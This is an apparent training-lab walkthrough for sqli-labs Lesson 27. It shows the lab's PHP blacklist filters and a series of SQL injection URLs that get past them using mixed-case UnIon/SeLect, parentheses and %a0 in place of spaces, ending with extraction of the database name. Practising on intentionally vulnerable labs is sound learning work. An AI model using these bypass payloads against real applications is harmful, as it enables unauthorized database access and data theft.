<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Bypassing blacklist filters 3</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Bypassing blacklist filters 3</h1><br/><br />In this lesson UNION/union, SELECT/select, SPACE and Comments are blocked.<br /><br />We&#39;re going to work on lesson 27.<br /><br />If you open &quot;/var/www/html/sqli-labs/Less-27/index.php&quot; file you can see what filters have been used.<br /><br /><div class="codebox"><div class="codebox">$id=&nbsp;preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;,&nbsp;$id);		//strip&nbsp;out&nbsp;/*<br />$id=&nbsp;preg_replace(&#39;/[--]/&#39;,&quot;&quot;,&nbsp;$id);		//Strip&nbsp;out&nbsp;--.<br />$id=&nbsp;preg_replace(&#39;/[#]/&#39;,&quot;&quot;,&nbsp;$id);			//Strip&nbsp;out&nbsp;#.<br />$id=&nbsp;preg_replace(&#39;/[&nbsp;+]/&#39;,&quot;&quot;,&nbsp;$id);	&nbsp;&nbsp;&nbsp;&nbsp;//Strip&nbsp;out&nbsp;spaces.<br />$id=&nbsp;preg_replace(&#39;/select/m&#39;,&quot;&quot;,&nbsp;$id);	&nbsp;&nbsp;&nbsp;&nbsp;//Strip&nbsp;out&nbsp;spaces.<br />$id=&nbsp;preg_replace(&#39;/[&nbsp;+]/&#39;,&quot;&quot;,&nbsp;$id);	&nbsp;&nbsp;&nbsp;&nbsp;//Strip&nbsp;out&nbsp;spaces.<br />$id=&nbsp;preg_replace(&#39;/union/s&#39;,&quot;&quot;,&nbsp;$id);	&nbsp;&nbsp;&nbsp;&nbsp;//Strip&nbsp;out&nbsp;union<br />$id=&nbsp;preg_replace(&#39;/select/s&#39;,&quot;&quot;,&nbsp;$id);	&nbsp;&nbsp;&nbsp;&nbsp;//Strip&nbsp;out&nbsp;select<br />$id=&nbsp;preg_replace(&#39;/UNION/s&#39;,&quot;&quot;,&nbsp;$id);	&nbsp;&nbsp;&nbsp;&nbsp;//Strip&nbsp;out&nbsp;UNION<br />$id=&nbsp;preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;,&nbsp;$id);	&nbsp;&nbsp;&nbsp;&nbsp;//Strip&nbsp;out&nbsp;SELECT<br />$id=&nbsp;preg_replace(&#39;/Union/s&#39;,&quot;&quot;,&nbsp;$id);	&nbsp;&nbsp;&nbsp;&nbsp;//Strip&nbsp;out&nbsp;Union<br />$id=&nbsp;preg_replace(&#39;/Select/s&#39;,&quot;&quot;,&nbsp;$id);	&nbsp;&nbsp;&nbsp;&nbsp;//Strip&nbsp;out&nbsp;select<br /></div></div><br /><br />You can change the “id” number as we&#39;ve already done in previous lessons.<br /><br />	<a href=""><img src="images/186-1.png" alt="images/186-1.png" /></a><br /><br />There&#39;s only a Hint to displaay the string after it has been filtered.<br /><br /><br /><br />a) Break the query.<br /><br />	URL: <a href="http://localhost/sqlilabs/Less-27/?id=1\">http://localhost/sqlilabs/Less-27/?id=1\</a><br /><br />	<a href=""><img src="images/186-2.png" alt="images/186-2.png" /></a><br /><br /><span style="indent:1;">Result: We got a SQL Error. The developer has used “&#39;” single quote to wrap the parameter.</span> You can check it out in the file we used above.<br />	<br />	<div class="codebox"><div class="codebox">&quot;SELECT&nbsp;*&nbsp;FROM&nbsp;users&nbsp;WHERE&nbsp;id=<span style="color:#dd0000;font-weight:400">&#39;$id&#39;</span>&nbsp;LIMIT&nbsp;<span style="color:#b07e00;font-weight:400">0</span>,<span style="color:#b07e00;font-weight:400">1</span>&quot;;</div></div><br /><br />	You can see id is between “&#39;”.<br />	<br />b) Fixing the query for SPACE into URL encode as parentheses.<br /><br /><span style="indent:1;">URL: </span><a href="http://localhost/sqlilabs/Less-26/?id=7'">http://localhost/sqlilabs/Less-26/?id=</a><a href="http://localhost/sqlilabs/Less-26/?id=7'">7&#39; OR (1)=&#39;1</a><br />	<br />	<a href=""><img src="images/186-3.png" alt="images/186-3.png" /></a><br /><br /><span style="indent:1;">Result: You have successfully fixed the query for SPACE into the URL encode as “()”</span><br /><br />c) Fixing “Union” and “Select”.<br /><br /><span style="indent:1;">URL: </span><a href="http://localhost/sqlilabs/Less-26/?id=7%27%20UnIon%a0SeLect">http://localhost/sqlilabs/Less-26/?id=7%27%20UnIon%a0SeLect (1),(2),(3)%20or%20(1)=%271</a><br /><br />	 Note: “UnIon” and “SeLect”. Keep in mind the Uppercase letters. <br /> <br />	<a href=""><img src="images/186-4.png" alt="images/186-4.png" /></a><br /><br />d) Retrieving Database Name.<br /><br /><span style="indent:1;">URL: </span> <a href="http://localhost/sqlilabs/Less-26/?id=7%27%20UnIon%a0SeLect">http://localhost/sqlilabs/Less-26/?id=%27%20UnIon%a0SeLect (1),(database()),(3)%20or%20(1)=%271</a><br /><br />	 NOTE: We invalidate the first part (7).<br /><br />	  <a href=""><img src="images/186-5.png" alt="images/186-5.png" /></a><br /><br />	Result: Database name is “security&quot;.<br />	<br />	<span style="indent:1;">We can recover other data the same way as in previos sections.</span><br /><br /><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>